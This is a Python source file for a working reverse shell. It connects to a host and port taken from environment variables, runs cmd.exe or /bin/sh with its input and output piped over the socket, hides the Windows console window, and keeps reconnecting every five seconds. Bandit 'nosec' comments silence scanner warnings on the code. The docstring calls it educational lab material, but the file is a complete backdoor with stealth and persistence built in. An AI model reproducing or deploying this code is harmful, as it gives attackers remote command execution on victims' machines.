import logging
import os
import socket
import subprocess  # nosec B404
import threading

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Handle Windows-specific imports gracefully for cross-platform testability
try:
    import win32con
    import win32gui
    HAS_WIN32 = True
except ImportError:
    HAS_WIN32 = False

class ReverseShell:
    """
    A professional, cross-platform capable Reverse Shell implementation.
    Oriented for educational and ethical cybersecurity laboratories.
    """

    def __init__(self):
        self.host = os.getenv("LHOST", "127.0.0.1")
        self.port = int(os.getenv("LPORT", 4444))
        self.socket = None
        self.process = None

    def hide_console(self):
        """Hides the console window if running on Windows."""
        if HAS_WIN32 and os.name == "nt":
            try:
                window = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(window, win32con.SW_HIDE)
            except Exception as e:
                logging.debug(f"Failed to hide console: {e}")

    def _stream_socket_to_process(self):
        """Streams data from socket to process stdin."""
        try:
            while True:
                data = self.socket.recv(1024)
                if not data:
                    break
                self.process.stdin.write(data)
                self.process.stdin.flush()
        except Exception as e:
            logging.debug(f"Socket to process stream error: {e}")

    def _stream_process_to_socket(self):
        """Streams data from process stdout to socket."""
        try:
            while True:
                char = self.process.stdout.read(1)
                if not char:
                    break
                self.socket.send(char)
        except Exception as e:
            logging.debug(f"Process to socket stream error: {e}")

    def start(self):
        """Starts the reverse shell connection and command execution."""
        while True:
            try:
                logging.info(f"Attempting to connect to {self.host}:{self.port}...")
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # nosec B113
                self.socket.connect((self.host, self.port))
                logging.info("Connection established.")

                shell = "cmd.exe" if os.name == "nt" else "/bin/sh"
                self.process = subprocess.Popen(  # nosec B603
                    [shell],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    stdin=subprocess.PIPE
                )

                # Start streaming threads
                s2p_thread = threading.Thread(target=self._stream_socket_to_process, daemon=True)
                p2s_thread = threading.Thread(target=self._stream_process_to_socket, daemon=True)

                s2p_thread.start()
                p2s_thread.start()

                self.hide_console()
                self.process.wait()

            except (ConnectionRefusedError, socket.error):
                logging.debug("Connection failed, retrying...")
            except KeyboardInterrupt:
                logging.info("Termination requested by user.")
                self.stop()
                break
            except Exception as e:
                logging.error(f"An unexpected error occurred: {e}")
            finally:
                self.stop()

            # Reconnection delay
            import time
            time.sleep(5)

    def stop(self):
        """Cleans up resources."""
        if self.socket:
            self.socket.close()
        if self.process:
            self.process.terminate()

if __name__ == "__main__":
    shell = ReverseShell()
    shell.start()
